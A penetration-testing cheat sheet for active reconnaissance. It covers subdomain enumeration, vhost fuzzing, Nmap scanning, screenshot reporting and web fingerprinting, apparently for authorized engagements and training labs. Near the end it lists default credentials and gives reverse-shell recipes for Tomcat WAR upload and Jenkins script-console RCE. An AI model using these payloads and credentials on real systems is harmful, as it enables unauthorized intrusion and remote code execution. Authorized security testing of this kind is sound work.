# Active Recon Cheat Sheet

> Direct interaction with target systems. Medium to high detection risk.  
> **Always have written authorization before proceeding.**  
> Run passive recon first — feed those findings into this phase.

---

## Table of Contents

- [Phase 1 — Subdomain Enumeration](#phase-1--subdomain-enumeration)
  - [DNS Zone Transfers](#dns-zone-transfers)
  - [Subdomain Brute-Forcing](#subdomain-brute-forcing)
  - [Virtual Host (VHost) Fuzzing](#virtual-host-vhost-fuzzing)
  - [Consolidate Your Subdomain List](#consolidate-your-subdomain-list)
- [Phase 2 — Port Scanning & Service Discovery](#phase-2--port-scanning--service-discovery)
  - [Nmap Scans](#nmap-scans)
  - [Common Web Ports](#common-web-ports)
  - [Nmap Output Formats](#nmap-output-formats)
  - [OS Hints from Open Ports](#os-hints-from-open-ports)
- [Phase 3 — Application Discovery & Screenshot Reports](#phase-3--application-discovery--screenshot-reports)
  - [EyeWitness](#eyewitness)
  - [Aquatone](#aquatone)
  - [What to Prioritize in Reports](#what-to-prioritize-in-reports)
- [Phase 4 — Active Fingerprinting](#phase-4--active-fingerprinting)
  - [Web Crawling / Spidering](#web-crawling--spidering)
  - [Technology & WAF Detection](#technology--waf-detection)
- [High-Value Application Reference](#high-value-application-reference)
- [Wordlists Reference](#wordlists-reference)
- [Notetaking Structure](#notetaking-structure)

---

## Phase 1 — Subdomain Enumeration

> Before scanning anything, collect every subdomain you can find.  
> Combine results from passive recon (CT logs, OSINT) with active brute-forcing and VHost fuzzing into one master list.  
> This list becomes the input for your port scans in Phase 2.

---

### DNS Zone Transfers

> Always attempt first — a misconfigured server gives you everything for free.

```bash
# Step 1 — identify nameservers
dig example.com NS

# Step 2 — attempt zone transfer against each nameserver
dig axfr @ns1.example.com example.com
dig axfr @ns2.example.com example.com

# Practice on intentionally vulnerable domain
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

A successful zone transfer reveals all subdomains, IPs, mail servers, and service records in one shot.

---

### Subdomain Brute-Forcing

#### dnsenum (all-in-one)

```bash
# Standard brute-force
dnsenum --enum example.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# With recursive brute-force
dnsenum --enum example.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r

# dnsenum also: attempts zone transfers, Google scraping, WHOIS, reverse lookups
```

#### ffuf

```bash
# Fast subdomain fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.example.com/ -mc 200,301,302,403
```

#### Other Tools

```bash
# fierce — recursive, wildcard-aware
fierce --domain example.com

# dnsrecon — multi-technique
dnsrecon -d example.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt

# amass — passive + active, many data sources
amass enum -d example.com
amass enum -active -d example.com -o amass-output.txt

# puredns — high-speed resolver-based brute-force
puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt example.com

# assetfinder — quick passive discovery
assetfinder --subs-only example.com
```

#### Tool Comparison

| Tool | Best For |
|---|---|
| `dnsenum` | All-in-one: brute-force + zone transfer + WHOIS + Google scraping |
| `ffuf` | Fast, highly customizable fuzzing |
| `amass` | Large scope, passive + active, many data sources |
| `puredns` | High-speed resolver-based brute-force at scale |
| `fierce` | Beginner-friendly, recursive, wildcard detection |
| `dnsrecon` | Versatile multi-technique recon |
| `assetfinder` | Quick passive discovery |

---

### Virtual Host (VHost) Fuzzing

> Finds non-public subdomains that share an IP but have no DNS record.  
> Run this against every discovered IP — you will often find hidden internal apps.

| Method | Finds |
|---|---|
| Subdomain brute-force | Subdomains with public DNS records only |
| VHost fuzzing | Public AND private subdomains on same IP (no DNS record needed) |

```bash
# Step 1 — add the target IP to /etc/hosts
sudo sh -c 'echo "TARGET_IP  example.htb" >> /etc/hosts'

# Step 2 — gobuster vhost discovery
gobuster vhost -u http://example.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

# gobuster with extra options
# -t 50   → threads
# -k      → ignore SSL/TLS errors
# -o      → save output to file
gobuster vhost -u https://example.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 50 -k -o vhost-results.txt

# Step 3 — ffuf alternative (fuzz the Host header directly)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.htb/ -H 'Host: FUZZ.example.htb'

# Step 4 — filter false positives
# First run without -fs to find the baseline response size of false positives
# Then re-run filtering that size out:
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.htb/ -H 'Host: FUZZ.example.htb' -fs 900

# Step 5 — add every discovered vhost to /etc/hosts before scanning
sudo sh -c 'echo "TARGET_IP  admin.example.htb" >> /etc/hosts'
```

**ffuf Filter / Match Flags:**

| Flag | Filter / Match By |
|---|---|
| `-fc` | HTTP status code (filter) |
| `-fs` | Response size in bytes (filter) |
| `-fw` | Word count in response (filter) |
| `-fl` | Line count in response (filter) |
| `-fr` | Regex pattern (filter) |
| `-mc` | Match specific status codes |
| `-ms` | Match specific response size |

---

### Consolidate Your Subdomain List

> Merge everything from passive recon (CT logs, OSINT) and active recon (brute-force, VHost fuzzing) into one clean list before scanning.

```bash
# Combine all subdomain sources into one file
cat subdomains-from-crtsh.txt subdomains-from-amass.txt subdomains-from-dnsenum.txt subdomains-from-vhost-gobuster.txt >> all-subdomains-raw.txt

# Deduplicate and sort
sort -u all-subdomains-raw.txt > all-subdomains.txt

# Verify which subdomains actually resolve
cat all-subdomains.txt | while read sub; do
  host $sub 2>/dev/null | grep "has address" && echo $sub
done | tee resolved-subdomains.txt

# Extract just the IP addresses for Shodan / port scanning
cat resolved-subdomains.txt | grep "has address" | awk '{print $NF}' | sort -u > ip-list.txt
```

This final `all-subdomains.txt` and `ip-list.txt` are your inputs for Phase 2.

---

## Phase 2 — Port Scanning & Service Discovery

> Scan every resolved subdomain and IP from Phase 1.  
> **Always save output as XML** — it feeds directly into the screenshot tools in Phase 3.

---

### Nmap Scans

```bash
# Step 1 — fast web port scan across your full scope list
# Save as XML for EyeWitness / Aquatone
sudo nmap -p 80,443,8000,8080,8180,8443,8888,8089,10000 --open -oA web_discovery -iL all-subdomains.txt

# Step 2 — service + version detection on discovered hosts
sudo nmap --open -sV -oA service_scan 10.10.10.10

# Step 3 — deeper scan with default scripts
sudo nmap -sC -sV -oA full_scan 10.10.10.10

# Step 4 — top 10,000 ports (run while reviewing screenshot reports)
sudo nmap --top-ports 10000 -oA top10k -iL ip-list.txt

# Step 5 — all TCP ports on high-value targets
sudo nmap -p- -oA all_tcp 10.10.10.10

# OS detection
sudo nmap -O 10.10.10.10

# UDP scan (slow — use selectively on key targets)
sudo nmap -sU --top-ports 200 10.10.10.10

# Scan multiple hosts from a file
sudo nmap -iL ip-list.txt -sV -oA multi_scan

# HTTP-specific enumeration script
sudo nmap -p80,443 -sV -sC --script=http-enum -oA http_enum 10.10.10.10
```

---

### Common Web Ports

| Port | Common Service |
|---|---|
| 80 | HTTP |
| 443 | HTTPS |
| 8000 | HTTP-alt / Splunk / dev servers |
| 8080 | HTTP-proxy / Tomcat / PRTG |
| 8180 | Tomcat (older installs) |
| 8443 | HTTPS-alt / admin panels |
| 8888 | HTTP-alt / Jupyter Notebook |
| 8089 | Splunk management (SSL) |
| 10000 | Webmin |
| 4848 | GlassFish admin |
| 9200 | Elasticsearch (often no auth) |
| 9090 | Prometheus / Cockpit |
| 7001 | WebLogic |
| 7080 | WebLogic (alt) |

---

### Nmap Output Formats

| Flag | Output | Use For |
|---|---|---|
| `-oA <name>` | All formats at once (`.nmap`, `.xml`, `.gnmap`) | **Always use this** |
| `-oX <name>.xml` | XML only | EyeWitness / Aquatone input |
| `-oN <name>.txt` | Human-readable | Quick review |
| `-oG <name>.gnmap` | Grepable | Scripting / grep |

---

### OS Hints from Open Ports

| Ports Observed | Likely OS |
|---|---|
| 135, 139, 445, 3389 | Windows |
| 5985, 5986 | Windows (WinRM) |
| 3389 + 5357 | Windows (SSDP/UPnP) |
| 22 with web ports | Linux / Unix |
| 4786 | Cisco Smart Install |

---

## Phase 3 — Application Discovery & Screenshot Reports

> Feed the Nmap XML output directly into screenshot tools.  
> This turns hundreds of scan results into an organized, visual, clickable report — saving hours of manual browsing.

**Full Workflow:**
1. Feed `web_discovery.xml` → EyeWitness + Aquatone
2. Open the HTML report in your browser
3. Work through it top to bottom — **High Value Targets** appear first
4. Note every interesting host: URL, application name, version, observations
5. While reviewing, run deeper Nmap scans (top 10k / all TCP) in the background
6. Feed any new scan XML back through the screenshot tools (iterative process)

---

### EyeWitness

```bash
# Install
sudo apt install eyewitness

# Or clone and install manually
git clone https://github.com/FortyNorthSecurity/EyeWitness.git
cd EyeWitness/Python/setup && bash setup.sh

# Run against Nmap XML — most common usage
eyewitness --web -x web_discovery.xml -d eyewitness_report/

# Run against a plain URL/host list
eyewitness --web -f urls.txt -d eyewitness_report/

# Run against a single URL
eyewitness --web --single http://10.10.10.10 -d eyewitness_report/

# Try both HTTP and HTTPS automatically
eyewitness --web -x web_discovery.xml -d eyewitness_report/ --prepend-https

# Full example with common options
# --timeout 10                      → max wait per host (default 7s)
# --threads 5                       → parallel threads
# --no-prompt                       → skip "open report?" prompt
# --add-http-ports 8000,8080,8888   → extra HTTP ports to check
# --add-https-ports 8443            → extra HTTPS ports to check
eyewitness --web -x web_discovery.xml -d eyewitness_report/ --timeout 10 --threads 5 --no-prompt --add-http-ports 8000,8080,8888 --add-https-ports 8443
```

EyeWitness will:
- Screenshot every discovered web app
- Categorize and fingerprint applications where possible
- Suggest default credentials based on detected application type
- Accept Nmap XML, Nessus XML, or plain URL/host lists

---

### Aquatone

```bash
# Download precompiled binary
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip

# Move to PATH (optional)
sudo mv aquatone /usr/local/bin/

# Run against Nmap XML — pipe directly
cat web_discovery.xml | aquatone -nmap

# Run against a URL/host list
cat urls.txt | aquatone

# Specify ports to probe
cat urls.txt | aquatone -ports 80,443,8000,8080,8443

# Set thread count and timeout (ms)
cat web_discovery.xml | aquatone -nmap -threads 5 -timeout 3000

# Output: aquatone_report.html — open in browser
```

---

### What to Prioritize in Reports

Work through the report top to bottom. Flag anything below immediately.

| Application / Page | Why It Matters | Attack Path |
|---|---|---|
| Apache Tomcat | Very common, often misconfigured | Default creds on `/manager` or `/host-manager` → upload malicious WAR → RCE |
| Splunk (free/trial) | Trial license may disable auth entirely | Direct access → run OS commands via search bar |
| PRTG Network Monitor | Known default creds | `prtgadmin:prtgadmin` → command injection via alert notifications |
| Jenkins | Script console frequently exposed | `admin:admin` → Groovy Script Console → RCE as service user |
| GitLab / GitHub (internal) | Self-registration often enabled | Register account → access private repos → harvest creds/tokens |
| WordPress | Most common CMS | Plugin CVEs, `xmlrpc.php` brute-force, `admin:admin` |
| Drupal | Known critical RCE CVEs | Drupalgeddon2, PHP filter module RCE |
| Joomla | CMS misconfigs | Config backup at `configuration.php.bak`, weak admin panel |
| osTicket / support portals | Sensitive ticket content | Email registration abuse, social engineering staff |
| Webmin | Admin panel with known CVEs | CVE-2019-15107 backdoor, weak credentials |
| Elasticsearch | No auth by default on old installs | `http://host:9200/_cat/indices` → direct data dump |
| Grafana | Default creds, CVEs | `admin:admin` → path traversal on older versions |
| Printer login pages | LDAP credential capture | Redirect LDAP server to attacker-controlled host → capture creds |
| ESXi / vCenter | Hypervisor access | Compromise = control over all virtual machines |
| iLO / iDRAC | Baseboard Management Controller | Full hardware control, persistent out-of-band access |
| Outlook Web Access / O365 | External email access | Password spraying, credential stuffing with breach data |
| Citrix / RDS portals | Remote access gateway | Test breach data credentials, session hijacking |
| File upload pages | Frequently lack validation | Upload webshell → RCE |
| `dev` / `staging` hostnames | Debug mode, weaker auth, test data | Always worth extra manual testing |
| Custom web applications | May contain any vulnerability | Manual testing: SQLi, XSS, IDOR, auth bypass, file inclusion |

---

## Phase 4 — Active Fingerprinting

> Once you have your target list from the screenshot reports, go deeper on interesting hosts.

---

### Web Crawling / Spidering

```bash
# Install Scrapy
pip3 install scrapy

# Download and run ReconSpider
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
python3 ReconSpider.py http://example.com
# Output saved to: results.json
```

**ReconSpider JSON output keys:**

| Key | Contains |
|---|---|
| `emails` | Email addresses found on the domain |
| `links` | Internal and external URLs |
| `external_files` | PDFs, docs, and other externally linked files |
| `js_files` | JavaScript files (may contain API keys, endpoints, secrets) |
| `form_fields` | HTML form inputs (login, upload, search fields) |
| `images` | Image URLs |
| `comments` | HTML source comments (often contain dev notes or hidden paths) |

Other crawlers: **Burp Suite Spider**, **OWASP ZAP Spider**, **Apache Nutch**

---

### Technology & WAF Detection

```bash
# WAF detection — always do this before aggressive testing
pip3 install git+https://github.com/EnableSecurity/wafw00f
wafw00f example.com

# WhatWeb — CLI technology fingerprinting
whatweb example.com
whatweb -a 3 example.com    # aggression level 3 (more requests, more detail)

# Nikto — software identification mode only
nikto -h example.com -Tuning b

# Nikto — full web server scan
nikto -h http://example.com

# Banner grabbing with curl
curl -I http://example.com
curl -sv http://example.com 2>&1 | head -50    # full verbose handshake

# Banner grabbing with netcat
nc -nv TARGET_IP 80
# Then send: GET / HTTP/1.0  (press Enter twice)
```

**Nikto Tuning Flags:**

| Flag | Runs |
|---|---|
| `b` | Software identification |
| `a` | File upload tests |
| `c` | Interesting files / seen in logs |
| `d` | Injection (XSS / HTML) |
| `e` | Remote file retrieval |
| `g` | Authentication bypass |
| `0` | File upload |
| `x` | Reverse tuning (run all except selected) |

---

## High-Value Application Reference

### Default Credentials

| Application | Default Credentials | Admin Path |
|---|---|---|
| Apache Tomcat | `tomcat:tomcat`, `admin:admin`, `admin:` | `/manager/html` |
| PRTG Network Monitor | `prtgadmin:prtgadmin` | `/` |
| Jenkins | `admin:admin` | `/` |
| Splunk | `admin:changeme` | `/en-US/account/login` |
| Webmin | `admin:admin` | `/` |
| Elasticsearch | (no auth by default) | `:9200/_cat/indices` |
| Grafana | `admin:admin` | `/login` |
| Jupyter Notebook | (token in server logs) | `/` |
| GlassFish | `admin:adminadmin` | `:4848` |
| WebLogic | `weblogic:weblogic` | `:7001/console` |
| JBoss | (no auth on old versions) | `/jmx-console` |
| phpMyAdmin | `root:` (blank password) | `/phpmyadmin` |
| Printer web UI | `admin:admin`, `admin:1234` | `/` |
| iDRAC | `root:calvin` | `/` |
| iLO | `Administrator:<serial number>` | `/` |

### Tomcat — WAR Upload RCE

```bash
# Generate malicious WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f war > shell.war

# Upload via Tomcat Manager at /manager/html
# Then trigger it:
curl http://target/shell/

# Or use Metasploit
use exploit/multi/http/tomcat_mgr_upload
```

### Jenkins — Groovy Script Console RCE

```bash
# Navigate to: http://jenkins-host/script

# Check OS command execution
def cmd = "id".execute()
println cmd.text

# Linux reverse shell
def cmd = "bash -c {echo,<BASE64_CMD>}|{base64,-d}|bash".execute()

# Windows reverse shell
def cmd = "powershell -enc <BASE64_CMD>".execute()
```

### Splunk — Free License RCE

```bash
# Free/trial Splunk: authentication may be entirely disabled
# Navigate to: http://target:8000
# If logged in: Settings → Search Commands → create malicious search command
# Or use existing Metasploit modules for Splunk
```

---

## Wordlists Reference

All from **SecLists**: https://github.com/danielmiessler/SecLists

```bash
# Install
sudo apt install seclists
# Default location: /usr/share/seclists/

# DNS / Subdomain brute-force
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt

# Web content / directory brute-force
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Passwords
/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

---

*Active recon requires written authorization. Document everything.*  
*Each phase feeds into the next — be thorough before moving forward.*
